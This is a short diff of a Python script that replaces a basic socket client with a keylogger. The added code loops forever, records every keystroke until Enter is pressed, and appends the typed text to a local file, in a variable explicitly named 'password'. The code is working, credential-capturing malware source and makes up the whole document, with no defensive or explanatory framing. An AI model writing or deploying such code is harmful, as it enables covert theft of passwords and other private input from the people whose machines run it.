@@ -1,8 +1,15 @@
-import socket
+import keyboard
 
-HOST = "10.0.2.15"  # The server's hostname or IP address
-PORT = 12345  # The port used by the server
+# Defining the text file name and path
+path = "data.txt"
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
-    s.sendall(b"Hello, server!")
+while True:
+    with open(path, "a") as data_file:
+
+        # All key presses are recorded as a list into "events"
+        # and the record loop stops when the "enter" key is pressed
+        events = keyboard.record("enter")
+        password = list(keyboard.get_typed_strings(events))
+
+        data_file.write("\n")  # New line written before data is written
+        data_file.write(password[0])
